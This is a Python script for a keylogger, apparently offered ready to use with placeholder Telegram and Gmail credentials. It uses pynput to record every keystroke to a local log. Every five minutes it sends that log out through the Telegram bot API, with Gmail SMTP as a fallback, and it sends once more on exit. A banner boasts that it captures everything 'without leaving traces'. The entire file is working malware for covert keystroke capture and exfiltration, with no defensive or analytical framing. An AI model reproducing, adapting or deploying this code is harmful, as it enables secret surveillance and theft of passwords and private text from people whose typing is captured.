import pynput
import logging
import os
import threading
import time
import smtplib
import requests
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# ========== BANNER ==========
BANNER = r"""
███████╗███████╗███████╗██╗      ██████╗  ██████╗ ██████╗ 
██╔════╝██╔════╝██╔════╝██║      ██╔══██╗██╔═══██╗██╔══██╗
███████╗█████╗  █████╗  ██║      ██████╔╝██║   ██║██║  ██║
╚════██║██╔══╝  ██╔══╝  ██║      ██╔═══╝ ██║   ██║██║  ██║
███████║███████╗██║     ███████╗██║     ╚██████╔╝██████╔╝
╚══════╝╚══════╝╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚═════╝ 
       🛡 Capturing everything, without leaving traces... 🛡
"""
print(BANNER)

# ========== CONFIGURATIONS ==========
TELEGRAM_BOT_TOKEN = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Add your Telegram bot token here
TELEGRAM_CHAT_ID = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Add your Telegram chat ID here
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
MAX_RETRIES = 3
EMAIL_SENDER = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Add your email sender here
EMAIL_PASSWORD = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Add your email password here
EMAIL_RECEIVER = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"  # Add your email receiver here

LOG_FILE = "keylogs.txt"
SEND_INTERVAL = 300  # 5 minutes

# ========== SETTING UP LOGGING ==========
if not os.path.exists("logs"):
    os.makedirs("logs")

logging.basicConfig(
    filename=os.path.join("logs", LOG_FILE),
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
)

# ========== KEY LOGGER FUNCTION ==========
def key_logger():
    print("[INFO] 🔍 Capturing all pressed keys...")
    
    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            print(f"[ERROR] ❌ Failed to capture key: {e}")

    with Listener(on_press=on_press) as listener:
        listener.join()

# ========== ENHANCED FUNCTION TO SEND TO TELEGRAM ==========
def send_to_telegram():
    log_path = os.path.join("logs", LOG_FILE)
    
    if not os.path.exists(log_path):
        print("[ERROR] ❌ Log file not found.")
        return False
    
    for attempt in range(MAX_RETRIES):
        try:
            with open(log_path, 'rb') as file:
                print(f"[INFO] 🔄 Attempt {attempt + 1} to send to Telegram...")
                
                # Attempt to send as document
                response = requests.post(
                    f"{TELEGRAM_API_URL}/sendDocument",
                    files={'document': file},
                    data={'chat_id': TELEGRAM_CHAT_ID},
                    timeout=15
                )
                
                if response.status_code == 200:
                    print("[INFO] ✅ Logs sent to Telegram successfully!")
                    return True
                else:
                    # If failed as document, try sending as message
                    file.seek(0)
                    log_content = file.read().decode('utf-8', errors='replace')
                    
                    if len(log_content) > 4096:
                        log_content = log_content[-4000:]
                    
                    text_response = requests.post(
                        f"{TELEGRAM_API_URL}/sendMessage",
                        data={
                            'chat_id': TELEGRAM_CHAT_ID,
                            'text': f"📝 Keylogger Logs:\n\n{log_content}"
                        },
                        timeout=15
                    )
                    
                    if text_response.status_code == 200:
                        print("[INFO] ✅ Logs sent as text message!")
                        return True
                    else:
                        print(f"[ERROR] ❌ Failed to send. Code: {response.status_code}")
                        time.sleep(5)

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] ❌ Connection error: {str(e)}")
            time.sleep(10 * (attempt + 1))
            
        except Exception as e:
            print(f"[ERROR] ❌ Unexpected error: {str(e)}")
            time.sleep(5)
    
    print("[ERROR] ❌ All attempts to send to Telegram failed.")
    return False

# ========== FUNCTION TO SEND LOGS BY E-MAIL ==========
def send_to_email():
    if os.path.exists(os.path.join("logs", LOG_FILE)):
        try:
            msg = MIMEMultipart()
            msg['From'] = EMAIL_SENDER
            msg['To'] = EMAIL_RECEIVER
            msg['Subject'] = "Keylogger Logs"
            
            body = "Attached are the logs of the typed keys."
            msg.attach(MIMEText(body, 'plain'))
            
            attachment = open(os.path.join("logs", LOG_FILE), "rb")
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={LOG_FILE}")
            msg.attach(part)
            attachment.close()
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_SENDER, EMAIL_PASSWORD)
            text = msg.as_string()
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, text)
            server.quit()
            
            print("[INFO] ✅ Logs sent by email successfully!")
        except Exception as e:
            print(f"[ERROR] ❌ Failed to send logs by email: {e}")

# ========== FUNCTION TO MANAGE LOG SENDING ==========
def send_logs():
    while True:
        time.sleep(SEND_INTERVAL)
        print("[INFO] ⏳ Trying to send logs...")
        if not send_to_telegram():
            print("[INFO] 📧 Trying to send logs by email...")
            send_to_email()

# ========== STARTING THREADS ==========
if __name__ == "__main__":
    try:
        print("[INFO] 🚀 Starting keylogger...")
        threading.Thread(target=key_logger, daemon=True).start()
        threading.Thread(target=send_logs, daemon=True).start()

        while True:
            time.sleep(10)
            
    except KeyboardInterrupt:
        print("\n[INFO] 🛑 Program interrupted by user. Exiting...")
        print("[INFO] 📤 Sending final logs...")
        if not send_to_telegram():
            send_to_email()
        print("[INFO] 👋 Goodbye!")

